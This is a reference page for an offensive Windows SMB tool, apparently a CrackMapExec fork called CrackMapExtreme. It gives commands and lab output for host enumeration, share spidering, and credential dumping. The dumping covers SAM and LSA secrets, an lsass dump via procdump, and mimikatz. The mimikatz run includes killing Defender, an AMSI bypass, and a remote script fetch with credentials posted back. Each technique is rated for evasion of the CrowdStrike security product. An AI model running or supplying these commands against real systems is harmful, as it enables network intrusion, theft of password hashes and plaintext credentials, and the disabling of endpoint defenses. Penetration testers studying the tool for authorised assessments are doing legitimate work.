---
layout: default
title: Host Enum via SMB
---
# SMB: Host Recon Reference
Created by: @awsmhacks  
Updated: 4/3/20  
CMX Version: 0.0.1.azdev1


**Notes:**
* The following examples assume you have a Kali/Windows host connected to an internal network.
* If you are running from Kali, be sure to escape special chars i.e ($,!)
* OPsec_safe results are from testing against crowdstrike on 4/3/2020. 

Host-Based Recon Sections  
  
1. [Local Users](#local-users)
2. [Logged On Users ](#logged-on-users)
3. [Local Sessions](#local-sessions)
4. [Local Groups](#enumerate-local-groups)
5. [Disks](#enumerate-disks)
6. [Shares and access](#enumerate-shares-and-access)
7. [Full Host Recon -- runs all the above recon commands in one go](#full-host-recon)
8. [Spidering Shares and Disks](#spidering-shares-and-disks)
9. [Retrieve Password Policy](#obtain-password-policy)
10. [Getting Creds via Secretsdump](#extracting-credentials)
11. [Getting Creds via procdump](#extracting-credentials)
12. [Getting Creds via mimikatz](#extracting-credentials)
13. [WMI Query Execution](#wmi-query-execution)
14. [UAC Check/Modify](#uac)
15. [Disable Defender](#kill-defender)
16. [Check if host is dual-homed](#dual-homed)
17. [Raw Command Execution](#command-execution)
18. [Interactive Shells](#getting-shellular)  

Need updates/Still need to document examples:  
X. [Raw Powershell Command Execution](#command-execution)  
X. [Services Checks](#service)  
X. [Registry Checks](#registry)  


### Testing Against Crowdstrike Progress - 4.3.20
-local users - pass  
-logged on users - pass  
-local sessions - pass  
-local disks - pass  
-shares - pass  
-full recon - pass  
-spider share - pass  
-secretsdump - pass  
-procdump - fail  -- and will break further coms - need to rework how it kills it  
-mimikatz -- amsi bypass is failing now - fail  
-interactive shells - wmi,at,dcom execmethods pass, smb+psexec are both caught.  
-command execution - wmi,at,dcom execmethods pass, smb+psexec are both caught.  


------------------------------------------------------------------------
# Local Users

* Enumerate local users

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

### Command Syntax  
`cmx smb TARGET -u Username -p Pass --local-users`
```
> cmx smb 192.168.0.103 -u arianna -p User!23 -local-users
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A   [+] SWAMP\arianna:User!23
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A   [+] Local Users enumerated on 192.168.0.103 !
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A         Local User Accounts
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A      WIN7A\Administrator   :500
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A      WIN7A\agrande         :1000
Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A      WIN7A\Guest           :501
```

------------------------------------------------------------------------
* Enumerate local users by bruteforcing RID

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false       | false       | TRUE       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

### Command Syntax  
`cmx smb TARGET -u Username -p Pass  --rid-brute`
```
> cmx smb 192.168.0.103 -u arianna -p User!23 --rid-brute
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A   [+] SWAMP\arianna:User!23
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A   [+] RID's enumerated on: 192.168.0.103
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A               RID Information
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A      WIN7A\Administrator   :500 (SidTypeUser)
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A      WIN7A\Guest           :501 (SidTypeUser)
Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A      WIN7A\None            :513 (SidTypeGroup)
Mar.25.20 15:33:12  SMB      192.168.0.103  WIN7A      WIN7A\agrande         :1000 (SidTypeUser)
```











------------------------------------------------------------------------
# Logged On Users

* Enumerate logged on users

Logged-on users are not the same as sessions!    

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | TRUE        | false       | TRUE       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

### Command Syntax  
`cmx smb TARGET -u Username -p Pass --loggedon`

  
```
> cmx smb 192.168.0.103 -u eminem -p Admin!23 --loggedon
Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A   [+] Loggedon-Users enumerated on 192.168.0.103 !
Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A      arianna is currently logged on 192.168.0.103 (WIN7A)
Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A      arianna is currently logged on 192.168.0.103 (WIN7A)
Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A      WIN7A$ is currently logged on 192.168.0.103 (WIN7A)
```









------------------------------------------------------------------------
# Local Sessions

* Enumerate active sessions

Sessions are not the same as logged-on users!

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false       | false       | TRUE       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}


### Command Syntax  
`cmx smb TARGET -u Username -p Pass --sessions`

Example:  
```
> cmx smb 192.168.0.103 -u arianna -p User!23 --sessions
Mar.25.20 16:24:06  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:24:07  SMB      192.168.0.103  WIN7A   [+] SWAMP\arianna:User!23
Mar.25.20 16:24:07  SMB      192.168.0.103  WIN7A   [+] Sessions enumerated on 192.168.0.103 !
Mar.25.20 16:24:07  SMB      192.168.0.103  WIN7A      arianna has session originating from 192.168.0.149 on 192.168.0.103
```










------------------------------------------------------------------------
# Enumerate local groups

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false       | false       | TRUE       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

### Command Syntax  
`cmx smb TARGET -u Username -p Pass --local-groups`

```
> cmx smb 192.168.0.103 -u arianna -p User!23 --local-groups
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A   [+] SWAMP\arianna:User!23
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A   [+] Local Groups enumerated on: 192.168.0.103
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A              Local Group Accounts
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A      Group: None                  membercount: 3
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A      WIN7A\Administrator
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A      WIN7A\Guest
Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A      WIN7A\agrande
```











------------------------------------------------------------------------
# Enumerate disks

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | TRUE        | false       | TRUE       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

### Command Syntax  
`cmx smb TARGET -u Username -p Pass --disks`

```
> cmx smb 192.168.0.103 -u eminem -p Admin!23 --disks
Mar.25.20 16:26:21  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:26:21  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:26:21  SMB      192.168.0.103  WIN7A   [+] Disks enumerated on 192.168.0.103 !
Mar.25.20 16:26:21  SMB      192.168.0.103  WIN7A      Found Disk: C: \
Mar.25.20 16:26:21  SMB      192.168.0.103  WIN7A      Found Disk: D: \
```














------------------------------------------------------------------------
# Enumerate shares and access

Attempts to authenticate to the target(s) and enumerate share access.

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false       | false       | TRUE       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

### Command Syntax  
`cmx smb TARGET -u Username -p Pass --shares`

Example:  
Without Local Admin
```
> cmx smb 192.168.0.103 -u arianna -p User!23 --shares
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A   [+] SWAMP\arianna:User!23
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A   [+] Shares enumerated on: 192.168.0.103
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A      Share           Permissions     Remark
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A      -----           -----------     ------
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A      ADMIN$                          Remote Admin
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A      C$                              Default share
Mar.25.20 16:28:33  SMB      192.168.0.103  WIN7A      IPC$                            Remote IPC
```
With local admin
```
> cmx smb 192.168.0.103 -u eminem -p Admin!23 --shares
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A   [+] Shares enumerated on: 192.168.0.103
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      Share           Permissions     Remark
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      -----           -----------     ------
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      ADMIN$          WRITE           Remote Admin
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      C$              WRITE           Default share
Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      IPC$                            Remote IPC
```
*try it with null user/passwords for null access. -u '' -p ''*  










------------------------------------------------------------------------
# Full Host Recon

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false       | false       | TRUE       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

Doesnt Require localadmin, but you'll get more info.
Can also be ran against multiple machines but the output is a lil messy.  

### Command Syntax  
`cmx smb TARGET -u Username -p Pass -hostrecon`

```
PS C:\Users\rywpr4\Documents\GitHub\CrackMapExtreme> cmx smb 192.168.0.104 -u eminem -p Admin!23 -hostrecon
Mar.26.20 16:18:31  SMB      192.168.0.104:445  SERVER2016A [*] Windows 10.0 Build 14393 x64 (domain:SWAMP) (signing:False) (SMBv:3.0)
Mar.26.20 16:18:31  SMB      192.168.0.104:445  SERVER2016A [+] SWAMP\eminem:Admin!23 (Pwn3d!)

Mar.26.20 16:18:31  SMB      192.168.0.104:445  SERVER2016A [*] Running All Host Recon Commands -
Mar.26.20 16:18:31  SMB      192.168.0.104:445  SERVER2016A [*] sessions,loggedon,rid-brute,disks,local users, local groups

Mar.26.20 16:18:31  SMB      192.168.0.104:445  SERVER2016A [+] Sessions enumerated on 192.168.0.104 !
Mar.26.20 16:18:31  SMB      192.168.0.104:445  SERVER2016A    eminem has session originating from 192.168.0.249 on 192.168.0.104

Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A [+] Loggedon-Users enumerated on 192.168.0.104 !
Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A    arianna is currently logged on 192.168.0.104 (SERVER2016A)
Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A    arianna is currently logged on 192.168.0.104 (SERVER2016A)
Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A    arianna is currently logged on 192.168.0.104 (SERVER2016A)
Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A$ is currently logged on 192.168.0.104 (SERVER2016A)
Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A$ is currently logged on 192.168.0.104 (SERVER2016A)
Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A$ is currently logged on 192.168.0.104 (SERVER2016A)

Mar.26.20 16:18:33  SMB      192.168.0.104:445  SERVER2016A [+] Local Users enumerated on 192.168.0.104 !
Mar.26.20 16:18:33  SMB      192.168.0.104:445  SERVER2016A       Local User Accounts
Mar.26.20 16:18:33  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\Administrator   :500
Mar.26.20 16:18:33  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\DefaultAccount  :503
Mar.26.20 16:18:33  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\Guest           :501

Mar.26.20 16:18:35  SMB      192.168.0.104:445  SERVER2016A [+] Local Groups enumerated on: 192.168.0.104
Mar.26.20 16:18:35  SMB      192.168.0.104:445  SERVER2016A            Local Group Accounts
Mar.26.20 16:18:35  SMB      192.168.0.104:445  SERVER2016A    Group: None                  membercount: 3
Mar.26.20 16:18:35  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\Administrator
Mar.26.20 16:18:35  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\Guest
Mar.26.20 16:18:35  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\DefaultAccount

Mar.26.20 16:18:36  SMB      192.168.0.104:445  SERVER2016A [+] RID's enumerated on: 192.168.0.104
Mar.26.20 16:18:36  SMB      192.168.0.104:445  SERVER2016A             RID Information
Mar.26.20 16:18:36  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\Administrator   :500 (SidTypeUser)
Mar.26.20 16:18:36  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\Guest           :501 (SidTypeUser)
Mar.26.20 16:18:36  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\DefaultAccount  :503 (SidTypeUser)
Mar.26.20 16:18:36  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\None            :513 (SidTypeGroup)

Mar.26.20 16:18:38  SMB      192.168.0.104:445  SERVER2016A [+] Disks enumerated on 192.168.0.104 !
Mar.26.20 16:18:38  SMB      192.168.0.104:445  SERVER2016A    Found Disk: C: \
Mar.26.20 16:18:38  SMB      192.168.0.104:445  SERVER2016A    Found Disk: D: \

Mar.26.20 16:18:39  SMB      192.168.0.104:445  SERVER2016A [+] Shares enumerated on: 192.168.0.104
Mar.26.20 16:18:39  SMB      192.168.0.104:445  SERVER2016A    Share           Permissions     Remark
Mar.26.20 16:18:39  SMB      192.168.0.104:445  SERVER2016A    -----           -----------     ------
Mar.26.20 16:18:39  SMB      192.168.0.104:445  SERVER2016A    ADMIN$          WRITE           Remote Admin
Mar.26.20 16:18:39  SMB      192.168.0.104:445  SERVER2016A    C$              WRITE           Default share
Mar.26.20 16:18:39  SMB      192.168.0.104:445  SERVER2016A    IPC$                            Remote IPC

Mar.26.20 16:18:40  SMB      192.168.0.104:445  SERVER2016A [*] Host Recon Complete
PS C:\Users\rywpr4\Documents\GitHub\CrackMapExtreme>

```



















--------------------------------------------------------------------------------------------------------------------------------------------------------
# Spidering Shares and Disks

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false*      | false       | TRUE       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

Options for spidering shares of remote systems.

### Command Syntax  
`cmx smb TARGET -u Username -p Pass --spider SHARE --pattern SEARCHPATTERN`

Spider the C drive for files with txt in the name (finds both sometxtfile.html and somefile.txt)  
This example is ran from a windows host.  
Example:  
```
> cmx smb 192.168.0.103 -u eminem -p Admin!23 --spider C$ --pattern txt
Mar.25.20 16:37:04  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:37:04  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:37:04  SMB      192.168.0.103  WIN7A   Spidering C$.
Mar.25.20 16:37:07  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/DVD Maker/Shared/DvdStyles/Pets/Pets_notes-txt-background.png [lastm:'2019-12-23 11:51' size:7888]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceAmharic.txt [lastm:'2019-12-23 11:51' size:16212]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceArray.txt [lastm:'2019-12-23 11:51' size:1272822]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceDaYi.txt [lastm:'2019-12-23 11:51' size:980102]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceSimplifiedQuanPin.txt [lastm:'2019-12-23 11:51' size:1665878]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceSimplifiedShuangPin.txt [lastm:'2019-12-23 11:51' size:1445430][!]
```
Note: the '$' and '!' characters need to be escaped if you are using a bash shell(\*nix)  
```
> cmx smb 192.168.0.103 -u eminem -p Admin\!23 --spider C\$ --pattern txt
Mar.25.20 16:37:04  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:37:04  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:37:04  SMB      192.168.0.103  WIN7A   Spidering C$.
Mar.25.20 16:37:07  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/DVD Maker/Shared/DvdStyles/Pets/Pets_notes-txt-background.png [lastm:'2019-12-23 11:51' size:7888]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceAmharic.txt [lastm:'2019-12-23 11:51' size:16212]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceArray.txt [lastm:'2019-12-23 11:51' size:1272822]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceDaYi.txt [lastm:'2019-12-23 11:51' size:980102]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceSimplifiedQuanPin.txt [lastm:'2019-12-23 11:51' size:1665878]
Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Program Files/Windows NT/TableTextService/TableTextServiceSimplifiedShuangPin.txt [lastm:'2019-12-23 11:51' size:1445430][!]
```







------------------------------------------------------------------------
# Obtain password policy

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false*      | false       | TRUE       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines


### Command Syntax  
`cmx smb TARGET -u Username -p Pass --pass-pol`

```
# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --local-auth --pass-pol
Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST  [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST  [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST  [+] Dumping password info for Host: WIN10TEST
Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Minimum password length: None
Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Password history length: None
Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Maximum password age:
Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Minimum password age: None
Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Reset Account Lockout Counter: 30 minutes
Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Locked Account Duration: 30 minutes
Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Account Lockout Threshold: None
Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Forced Log off Time: Not Set

```









--------------------------------------------------------------------------------------------------------------------------------------------------------
# Extracting Credentials

Output for cred dumping commands are saved to the logs folder.   
Exact location is mentioned after the command.   
  
### \*Dump SAM hashes using methods from secretsdump.py 

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | TRUE        | false       | TRUE       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

### Command Syntax  
`cmx smb TARGET -u Username -p Pass --sam`

```
> cmx smb 192.168.0.103 -u eminem -p Admin!23 --sam
Mar.25.20 16:49:35  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:49:35  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:49:35  SMB      192.168.0.103  WIN7A   [*] Dumping SAM hashes on 192.168.0.103
Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A   [+] SAM hashes dump of 192.168.0.103
Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A      Administrator:500:aad3b435b51404eeaad3b435b51404ee:10eca58175d4228ece151e287086e824:::
Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A      agrande:1000:aad3b435b51404eeaad3b435b51404ee:710192d5abf367192c10a94d378bd45b:::
Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A   [+] Added 3 SAM hashes to the database
Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A   [+] Saved 3 hashes to ~\.cmx\logs/WIN7A_192.168.0.103_2020-03-25_164935.sam
```

------------------------------------------------------------------------
### \*Dump LSA secrets using methods from secretsdump.py 

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | TRUE        | false       | TRUE       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

### Command Syntax  
`cmx smb TARGET -u Username -p Pass --lsa`

Sometimes you'll get plaintext passwords! (Usually service accounts).  
```
> cmx smb 192.168.0.103 -u eminem -p Admin!23 --lsa
Mar.25.20 16:50:45  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 16:50:45  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 16:50:45  SMB      192.168.0.103  WIN7A   [*] Dumping LSA Secrets on 192.168.0.103
Mar.25.20 16:50:47  SMB      192.168.0.103  WIN7A   [+] LSA Secrets dump for 192.168.0.103
Mar.25.20 16:50:47  SMB      192.168.0.103  WIN7A      SWAMP.LOCAL /drake:$DCC2$10240#drake#1fbd3853327bcefeaa7c666ba8e28004
Mar.25.20 16:50:47  SMB      192.168.0.103  WIN7A      SWAMP.LOCAL /arianna:$DCC2$10240#arianna#88e0a0e778e67d9e35748fa7e89ccaeb
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A      SWAMP\WIN7A$:aes256-cts-hmac-sha1-96:fb04e5dd3627a764476e4f1d661942fe52579237ccc8237436a20e6b75216843
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A      SWAMP\WIN7A$:aes128-cts-hmac-sha1-96:3c611b405b20f88e039e23b10624d41c
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A      SWAMP\WIN7A$:des-cbc-md5:7a1340ea73e680ec
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A      SWAMP\WIN7A$:aad3b435b51404eeaad3b435b51404ee:42d8cf1444bb879485532fea86c9e53e:::
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A      dpapi_machinekey:0x6e27cf111a55495fd6aab7d4d3120ffb1b726fa4
dpapi_userkey:0x0cd38e83384273f6e20d629f17d9891f4b8e5f0d
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A      NL$KM:825290be276dc54bee542f18d5b979e97e2da16102c30a44f40ea047b682cb48db90d23c2fc77970950f17192538d9c24ea67ac8187819d5bd3925be2ebc36cb
Mar.25.20 16:50:49  SMB      192.168.0.103  WIN7A   [+] Saved 8 LSA secrets to ~\.cmx\logs/WIN7A_192.168.0.103_2020-03-25_165045.secrets
```

------------------------------------------------------------------------
### \*Procdump Method

CMX transfers procdump64.exe to the host, dumps lsass.exe, pulls the dump back (so you can work locally with it more if you want), and finally parses the dump via skelsec's pypykatz.  

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | TRUE        | false       | False*     |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}
Crowdstrike detects this, however, windows defender doesnt.



### Command Syntax  
`cmx smb TARGET -u Username -p Pass --dump`

```
# cmx smb 192.168.0.103 -u eminem -p Admin\!23 --dump
Mar.25.20 19:21:25  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 19:21:25  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Mar.25.20 19:21:26  SMB      192.168.0.103  WIN7A   [*] Uploading procdump64
Mar.25.20 19:21:27  SMB      192.168.0.103  WIN7A   [*] Waiting for procdump to finish
Mar.25.20 19:21:36  SMB      192.168.0.103  WIN7A   [*] Downloading dump file to current directory
Mar.25.20 19:21:37  SMB      192.168.0.103  WIN7A   [+] Success, now cleaning up on target.
Mar.25.20 19:21:37  SMB      192.168.0.103  WIN7A      Results:
Mar.25.20 19:21:37  SMB      192.168.0.103  WIN7A       SWAMP\arianna:User!23
Mar.25.20 19:21:37  SMB      192.168.0.103  WIN7A       SWAMP\WIN7A$:42d8cf1444bb879485532fea86c9e53e
Mar.25.20 19:21:37  SMB      192.168.0.103  WIN7A       SWAMP\arianna:bbc2bf2fbca9dd9ed74d3c1b55e3d727

```


------------------------------------------------------------------------
### \*Mimikatz Method


|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | TRUE        | false       | false*     |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}
Crowdstrike catches this.

\* Note: Windows Defender might catch this (depends on host OS version), so be sure to add the -kd switch if you think defender is running.  
-kd = kill defender

\* Note: as of april/3/2020 the powershell amsi bypass is getting caught by defender on up-to-date win10
Killing defender will still work but may throw an alert to the end user when the amsi bypass fails. 

### Command Syntax  
`cmx smb TARGET -u Username -p Pass -kd -M mimikatz`

```
# cmx smb 192.168.0.103 -u eminem -p Admin\!23 -kd -M mimikatz
Mar.25.20 19:19:00  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 19:19:00  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
            [!] Sleeping to allow defender process to finish shutting down[!] 
Mar.25.20 19:19:10  MIMIK...    192.168.0.103        - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
Mar.25.20 19:19:19  MIMIK...    192.168.0.103        - - "POST / HTTP/1.1" 200 -
Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\arianna:bbc2bf2fbca9dd9ed74d3c1b55e3d727
Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\WIN7A$:42d8cf1444bb879485532fea86c9e53e
Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\arianna:User!23
Mar.25.20 19:19:19  MIMIK...    192.168.0.103        [+] Added 3 credential(s) to the database
